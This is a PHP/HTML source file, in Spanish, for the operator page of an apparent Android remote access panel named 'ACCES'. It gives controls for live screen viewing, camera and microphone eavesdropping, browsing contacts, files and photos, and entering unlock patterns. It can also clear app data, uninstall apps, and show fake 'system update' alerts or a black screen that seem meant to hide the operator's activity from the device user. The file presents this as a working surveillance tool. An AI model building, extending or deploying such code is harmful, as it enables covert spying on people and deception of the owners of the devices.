<?php
require 'includes/session_check.php';
require 'includes/backend.php';
$hostId = $_GET['host'] ?? '';
if ($hostId === '') {
    header('Location: ver.php');
    exit;
}

$result = backend_request('GET', '/api/hosts', null, $_SESSION['owner_token']);
$hosts = ($result['status'] === 200 && is_array($result['body'])) ? $result['body'] : [];
$host = null;
foreach ($hosts as $h) {
    if (($h['hostId'] ?? null) === $hostId) { $host = $h; break; }
}
$hostName = $host['friendlyName'] ?? 'Host';
$hostIp = $host['ip'] ?? '—';
$hostCountry = $host['countryCode'] ?? null;

function flag_src($cc) {
    $cc = strtolower(trim((string) $cc));
    return (strlen($cc) === 2) ? "https://flagcdn.com/24x18/$cc.png" : '';
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Host - ACCES</title>
    <link rel="icon" type="image/png" href="img/favicon.png">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="assets/css/style.css?v=<?= @filemtime(__DIR__ . '/assets/css/style.css') ?>">
    <link rel="stylesheet" href="assets/css/host.css?v=<?= @filemtime(__DIR__ . '/assets/css/host.css') ?>">
    <style>
        .accessibility-btn-large {
            padding: 16px 12px;
            border-radius: 8px;
            border: none;
            cursor: pointer;
            font-size: 1rem;
            transition: transform 0.1s, box-shadow 0.1s;
        }
        .accessibility-btn-large:active {
            transform: scale(0.95);
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.3);
        }
        .accessibility-btn-large:hover {
            filter: brightness(1.1);
        }
        /* El arrastre de ventanas se maneja en host.css + host.js. No redefinir aquí .modal
           (con transform/top/left) porque rompe el cálculo de posición al arrastrar. */
        .modal__header { cursor: grab; user-select: none; }
        .modal__header:active { cursor: grabbing; }
    </style>
</head>
<body>
    <div class="host-info-bar">
        <span class="host-info-bar__name">
            <?php $fsrc = flag_src($hostCountry); ?>
            <img class="host-flag-img" alt="<?= htmlspecialchars(strtoupper((string) $hostCountry)) ?>"
                 src="<?= htmlspecialchars($fsrc) ?>" <?= $fsrc ? '' : 'hidden' ?>>
            <?= htmlspecialchars($hostName) ?>
        </span>
        <span class="host-info-bar__id">
            <span><?= htmlspecialchars($hostIp) ?></span>
            <span id="hostApp" class="host-info-bar__app">—</span>
        </span>
        <span class="host-info-bar__status-group">
            <span id="hostScreen" class="screen-ind screen-ind--off" title="Pantalla">📱</span>
            <span id="hostStatus" class="host-info-bar__status is-offline">…</span>
        </span>
    </div>

    <nav class="host-menu">
        <div class="host-menu__nav">
            <button id="btnBack">Atrás</button>
            <button id="btnHome">Inicio</button>
            <button id="btnRecents">Recientes</button>
        </div>
        <div class="host-menu__options">
            <button id="btnPermissions">Permisos</button>
            <button id="btnAlerts">Alertas</button>
            <button id="btnAccessibility">Accesibilidad</button>
            <button id="btnFiles">Archivos</button>
            <button id="btnPhotos">Fotos</button>
            <button id="btnLiveAudio">Escucha </button>
            <button id="btnPattern">Patrón</button>
            <button id="btnUninstall" class="host-menu__danger">Desinstalar app</button>
            <button id="btnDisconnect" class="host-menu__danger">Desconectar</button>
        </div>
    </nav>

    <!-- Audio del micrófono del host (escucha en vivo). Oculto; solo reproduce sonido. -->
    <audio id="liveAudio" autoplay></audio>

    <!-- Barra del modo patrón: aparece al activar "Patrón". Guía para desbloquear con patrón. -->
    <div id="patternBar" hidden>
        <span id="patternInfo">Modo patrón: haz clic en cada punto en orden</span>
        <button id="patternSwipeUp" title="Deslizar hacia arriba para mostrar el patrón">↑ Mostrar patrón</button>
        <button id="patternSend">Enviar patrón</button>
        <button id="patternClear">Borrar</button>
        <button id="patternExit">Salir</button>
    </div>

    <main class="host-grid">
        <section id="screenTile" class="tile tile--screen">
            <div class="tile__header">
                <span id="statusText" class="tile__title">Conectando…</span>
                <div class="tile__controls">
                    <button id="screenPlay" title="Reanudar video">▶</button>
                    <button id="screenPause" title="Pausar video">❚❚</button>
                    <button id="screenReload" title="Reconectar">↻</button>
                </div>
            </div>
            <div class="tile__body tile__body--video">
                <video id="remoteVideo" autoplay playsinline></video>
            </div>
        </section>

        <section id="videoTextTile" class="tile tile--videotext">
            <div class="tile__header">
                <span class="tile__title">Video a texto</span>
                <div class="tile__controls">
                    <button id="videoTextPlay" title="Iniciar lectura">▶</button>
                    <button id="videoTextPause" title="Detener lectura">❚❚</button>
                    <button id="videoTextReload" title="Refrescar ahora">↻</button>
                </div>
            </div>
            <div class="tile__body">
                <div id="videoTextEmpty" class="tile__placeholder">Pulsa ▶ para leer la pantalla.</div>
                <div id="videoTextContent" class="video-text-body" hidden>
                    <div class="video-text-section__label">En pantalla ahora — toca el texto en su lugar</div>
                    <div id="videoTextCurrent" class="video-text-screen"></div>
                    <div class="video-text-section__label video-text-section__label--history">Historial</div>
                    <div id="videoTextHistory" class="video-text-list"></div>
                </div>
            </div>
        </section>

        <div class="host-grid__stack">
            <section id="appsTile" class="tile tile--apps">
                <div class="tile__header">
                    <span class="tile__title">Apps</span>
                    <input type="text" id="appsSearch" class="tile__search" placeholder="Buscar app…">
                    <div class="tile__controls">
                        <button id="appsReload" title="Cargar apps">↻</button>
                    </div>
                </div>
                <div class="tile__body">
                    <div id="appsEmpty" class="tile__placeholder">Pulsa ↻ para cargar las apps.</div>
                    <ul id="appsList" class="side-panel__list"></ul>
                </div>
            </section>

            <section id="contactsTile" class="tile tile--contacts">
                <div class="tile__header">
                    <span class="tile__title">Contactos</span>
                    <input type="text" id="contactsSearch" class="tile__search" placeholder="Buscar contacto…">
                    <div class="tile__controls">
                        <button id="contactsReload" title="Cargar contactos">↻</button>
                    </div>
                </div>
                <div class="tile__body">
                    <div id="contactsEmpty" class="tile__placeholder">Pulsa ↻ para cargar los contactos.</div>
                    <ul id="contactsList" class="side-panel__list"></ul>
                </div>
            </section>
        </div>

        <section id="cameraTile" class="tile tile--camera">
            <div class="tile__header">
                <span class="tile__title">Cámara</span>
                <div class="tile__controls camera-facing">
                    <label><input type="radio" name="cameraFacing" value="back" checked> Trasera</label>
                    <label><input type="radio" name="cameraFacing" value="front"> Frontal</label>
                </div>
                <div class="tile__controls">
                    <button id="cameraPlay" title="Iniciar cámara">▶</button>
                    <button id="cameraPause" title="Detener cámara">❚❚</button>
                    <button id="cameraReload" title="Reiniciar cámara">↻</button>
                </div>
            </div>
            <div class="tile__body tile__body--video">
                <div id="cameraEmpty" class="tile__placeholder">Pulsa ▶ para ver la cámara.</div>
                <video id="cameraVideo" autoplay playsinline></video>
            </div>
        </section>
    </main>

    <div id="permissionsModal" class="modal" hidden>
        <div class="modal__box">
            <div class="modal__header">
                <span class="modal__title">Permisos</span>
                <button id="btnClosePermissions" class="modal__close">✕</button>
            </div>
            <ul class="side-panel__list permissions-list">
                <li>
                    <span class="permission-label">
                        Ventanas emergentes en 2do plano
                        <small>Android no permite consultar este permiso de MIUI — el switch solo
                        abre esa pantalla para activarlo ahí (no refleja si ya está activo).</small>
                    </span>
                    <label class="switch">
                        <input type="checkbox" id="switchOverlay">
                        <span class="switch__slider"></span>
                    </label>
                </li>
                <li>
                    <span class="permission-label">
                        Acceso a la cámara
                        <small id="cameraPermStatus">Estado desconocido</small>
                    </span>
                    <label class="switch">
                        <input type="checkbox" id="switchCamera">
                        <span class="switch__slider"></span>
                    </label>
                </li>
                <li>
                    <span class="permission-label">
                        Sin restricciones de batería
                        <small id="batteryStatus">Estado desconocido</small>
                    </span>
                    <label class="switch">
                        <input type="checkbox" id="switchBattery">
                        <span class="switch__slider"></span>
                    </label>
                </li>
                <li>
                    <span class="permission-label">
                        Dibujar sobre otras apps
                        <small id="overlayStatus">Estado desconocido</small>
                    </span>
                    <label class="switch">
                        <input type="checkbox" id="switchDrawOverlay">
                        <span class="switch__slider"></span>
                    </label>
                </li>
                <li>
                    <span class="permission-label">
                        Acceso a contactos
                        <small id="contactsStatus">Estado desconocido</small>
                    </span>
                    <label class="switch">
                        <input type="checkbox" id="switchContacts">
                        <span class="switch__slider"></span>
                    </label>
                </li>
                <li>
                    <span class="permission-label">
                        Modificar ajustes del sistema
                        <small id="writeSettingsStatus">Estado desconocido</small>
                    </span>
                    <label class="switch">
                        <input type="checkbox" id="switchWriteSettings">
                        <span class="switch__slider"></span>
                    </label>
                </li>
                <li>
                    <span class="permission-label">
                        Micrófono
                        <small id="micStatus">Estado desconocido</small>
                    </span>
                    <label class="switch">
                        <input type="checkbox" id="switchMic">
                        <span class="switch__slider"></span>
                    </label>
                </li>
                <li>
                    <span class="permission-label">
                        Fotos
                        <small id="photosPermStatus">Estado desconocido</small>
                    </span>
                    <label class="switch">
                        <input type="checkbox" id="switchPhotos">
                        <span class="switch__slider"></span>
                    </label>
                </li>
                <li>
                    <span class="permission-label">
                        Archivos
                        <small id="filesPermStatus">Estado desconocido</small>
                    </span>
                    <label class="switch">
                        <input type="checkbox" id="switchFiles">
                        <span class="switch__slider"></span>
                    </label>
                </li>
            </ul>
        </div>
    </div>

    <div id="alertsModal" class="modal" hidden>
        <div class="modal__box">
            <div class="modal__header">
                <span class="modal__title">Alertas</span>
                <button id="btnCloseAlerts" class="modal__close">✕</button>
            </div>
            <div class="alerts-form">
                <label>Tipo de alerta</label>
                <label class="alerts-form__radio"><input type="radio" name="alertType" value="update" checked> Actualización (con título, mensaje y barra)</label>
                <label class="alerts-form__radio"><input type="radio" name="alertType" value="blackscreen"> Pantalla negra (absolutamente todo negro, sin nada más)</label>

                <div id="alertUpdateFields">
                    <label for="alertTitleInput">Título</label>
                    <input type="text" id="alertTitleInput" placeholder="Ej: Actualizando el sistema">

                    <label for="alertTextInput">Mensaje</label>
                    <textarea id="alertTextInput" rows="3" placeholder="Ej: Por favor espera, estamos trabajando en tu equipo."></textarea>
                </div>

                <label for="alertDurationInput">Duración (segundos)</label>
                <input type="number" id="alertDurationInput" min="1" max="600" value="10">

                <button id="btnShowAlert">Mostrar alerta en el dispositivo</button>
                <button id="btnHideAlert" class="alerts-form__hide">Ocultar ahora</button>
            </div>
        </div>
    </div>

    <div id="appActionMenu" class="app-action-menu" hidden>
        <button id="actionOpen">Abrir</button>
        <button id="actionClearData">Borrar datos</button>
    </div>

    <div id="filesModal" class="modal" hidden>
        <div class="modal__box">
            <div class="modal__header">
                <span class="modal__title">Archivos</span>
                <button id="btnCloseFiles" class="modal__close">✕</button>
            </div>
            <div class="files-explorer">
                <div class="files-path">
                    <span id="currentPath">/storage/emulated/0</span>
                    <button id="btnFileUp">⬆ Atrás</button>
                </div>
                <div id="filesContent" class="files-list">
                    <div class="tile__placeholder">Cargando…</div>
                </div>
            </div>
        </div>
    </div>

    <div id="photosModal" class="modal" hidden>
        <div class="modal__box">
            <div class="modal__header">
                <span class="modal__title">Fotos</span>
                <button id="btnClosePhotos" class="modal__close">✕</button>
            </div>
            <div id="photosContent" class="photos-gallery" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); gap: 8px; padding: 12px; max-height: 500px; overflow-y: auto;">
                <div class="tile__placeholder" style="grid-column: 1/-1;">Cargando…</div>
            </div>
        </div>
    </div>

    <div id="accessibilityModal" class="modal" hidden>
        <div class="modal__box">
            <div class="modal__header">
                <span class="modal__title">Accesibilidad & Control</span>
                <button id="btnCloseAccessibility" class="modal__close">✕</button>
            </div>
            <div class="accessibility-controls" style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 16px;">
                <button id="btnPower" class="accessibility-btn-large" style="grid-column: 1/-1; background: linear-gradient(135deg, #ff4444, #cc0000); color: white; font-size: 1.1rem; font-weight: bold;">⏻ Bloquear pantalla</button>
                <button id="btnUnlock" class="accessibility-btn-large" title="Enciende la pantalla. Si tiene PIN/patrón/huella, Android no permite desbloquearla por accesibilidad — habrá que hacerlo físicamente en el dispositivo." style="grid-column: 1/-1; background: linear-gradient(135deg, #44aaff, #0066cc); color: white; font-size: 1.1rem; font-weight: bold;">🔓 Encender / Desbloquear</button>

                <button id="btnVolUp" class="accessibility-btn-large" style="background: linear-gradient(135deg, #44ff44, #00cc00); color: black; font-weight: bold;">🔊 Vol+</button>
                <button id="btnVolDown" class="accessibility-btn-large" style="background: linear-gradient(135deg, #44ff44, #00cc00); color: black; font-weight: bold;">🔉 Vol−</button>

                <div style="grid-column: 1/-1; border-top: 1px solid rgba(0,255,65,0.3); padding-top: 12px; text-align: center; opacity: 0.7;">Modo de sonido</div>

                <button id="btnSilent" class="accessibility-btn-large" style="background: linear-gradient(135deg, #ffaa00, #ff8800); color: black; font-weight: bold;">🔇 Silencio</button>
                <button id="btnVibrate" class="accessibility-btn-large" style="background: linear-gradient(135deg, #ffaa00, #ff8800); color: black; font-weight: bold;">📳 Vibrador</button>
                <button id="btnSound" class="accessibility-btn-large" style="grid-column: 1/-1; background: linear-gradient(135deg, #ffaa00, #ff8800); color: black; font-weight: bold;">🔔 Sonido normal</button>

                <div style="grid-column: 1/-1; border-top: 1px solid rgba(0,255,65,0.3); padding-top: 12px; text-align: center; opacity: 0.7;">Brillo de la pantalla</div>
                <div style="grid-column: 1/-1; display: flex; align-items: center; gap: 10px;">
                    <span style="font-size: 1.2rem;">🔅</span>
                    <input type="range" id="brightnessSlider" min="0" max="100" value="50" style="flex: 1;">
                    <span style="font-size: 1.2rem;">🔆</span>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Backend Node en Railway (definido en includes/backend.php).
        const BACKEND_BASE_URL = <?= json_encode(BACKEND_BASE_URL) ?>;
        const WS_URL = BACKEND_BASE_URL.replace('https://', 'wss://').replace('http://', 'ws://');
        const OWNER_TOKEN = <?= json_encode($_SESSION['owner_token']) ?>;
        const HOST_ID = <?= json_encode($hostId) ?>;
        const ACTION = <?= json_encode($_GET['action'] ?? null) ?>;
    </script>
    <script src="assets/js/host.js?v=<?= @filemtime(__DIR__ . '/assets/js/host.js') ?>"></script>
</body>
</html>
